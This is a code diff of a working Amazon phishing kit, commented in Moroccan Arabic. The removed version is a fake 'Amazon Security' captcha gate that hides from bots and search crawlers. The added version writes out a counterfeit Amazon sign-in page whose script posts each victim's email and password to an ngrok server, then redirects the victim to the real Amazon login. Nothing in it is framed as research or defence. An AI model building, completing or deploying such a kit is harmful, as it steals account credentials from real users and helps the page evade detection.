@@ -1,54 +1,59 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification - Amazon Security</title>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-    <style>
-        /* Hidden from bots */
-        body { background: #EAEDED; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        #gate { background: white; max-width: 400px; width: 90%; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .g-recaptcha { margin: 20px auto; display: inline-block; }
-        #v-btn { background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
-        #v-btn:disabled { background: #ccc; cursor: not-allowed; }
-        .loader { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #FF9900; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div id="gate">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100" alt="Amz">
-        <p style="font-size: 14px; color: #555;">To protect your account, please solve the challenge below.</p>
-        <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="unlock"></div>
-        <div class="loader" id="ldr"></div>
-        <button id="v-btn" disabled>Continue</button>
-    </div>
+<script>
+    // الرابط ديال ngrok ديالك
+    const SERVER_URL = "https://743a-196-113-84-3.ngrok-free.app/receive";
 
-    <script>
-        // Obfuscation Layer: السيرفر مشفر بـ Base64 باش الـ Crawlers ما يعرفوهش
-        // الرابط الجاي خاصك تبدلو بـ ngrok ديالك (بعدما تشفرو بـ base64)
-        const _0x1a2b = "https://743a-196-113-84-3.ngrok-free.app/receive"; 
-        
-        function unlock() { document.getElementById('v-btn').disabled = false; }
+    function unlock() { 
+        document.getElementById('v-btn').disabled = false; 
+    }
 
-        document.getElementById('v-btn').onclick = function() {
-            this.style.display = 'none';
-            document.getElementById('ldr').style.display = 'block';
-            
-            // جلب محتوى السكاما (Injecting the phishing layer)
-            setTimeout(() => {
-                const _sc = `... (Full Phishing HTML Code) ...`; // الكود الطويل ديال أمازون
-                document.open();
-                document.write(_sc);
-                document.close();
-            }, 800);
-        };
-
-        // Anti-Bot Protection
-        if (navigator.webdriver || /bot|google|baidu|bing|msn|duckduckgo|slurp|yandex/i.test(navigator.userAgent)) {
-            window.location.href = "https://www.google.com";
-        }
-    </script>
-</body>
-</html>
+    document.getElementById('v-btn').onclick = function() {
+        // فاش كيبرك على الزر، كنمسحو البوابة ونحطو السكاما
+        document.open();
+        document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Amazon Sign-In</title>
+                <style>
+                    body { font-family: Arial, sans-serif; text-align: center; background: white; margin-top: 50px; }
+                    .login-box { width: 350px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 4px; text-align: left; }
+                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; }
+                    button { width: 100%; padding: 10px; background: #f0c14b; border: 1px solid #a88734; border-radius: 3px; cursor: pointer; font-weight: bold; }
+                    .footer { font-size: 12px; color: #555; margin-top: 20px; text-align: center; }
+                </style>
+            </head>
+            <body>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100" style="margin-bottom:20px;">
+                <div class="login-box">
+                    <h1 style="font-weight: 400; font-size: 28px;">Sign-In</h1>
+                    <label>Email or mobile phone number</label>
+                    <input type="email" id="email_user">
+                    <label>Password</label>
+                    <input type="password" id="pass_user">
+                    <button id="submit_btn">Continue</button>
+                    <p style="font-size: 12px; margin-top: 15px;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
+                </div>
+                <div class="footer">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
+                
+                <script>
+                    document.getElementById('submit_btn').onclick = function() {
+                        const email = document.getElementById('email_user').value;
+                        const pass = document.getElementById('pass_user').value;
+                        
+                        fetch("${SERVER_URL}", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ email: email, password: pass, time: new Date().toLocaleString() })
+                        }).then(() => {
+                            window.location.href = "https://www.amazon.com/ap/signin";
+                        }).catch(() => {
+                            alert("Connection Error. Try again.");
+                        });
+                    };
+                <\/script>
+            </body>
+            </html>
+        `);
+        document.close();
+    };
+</script>
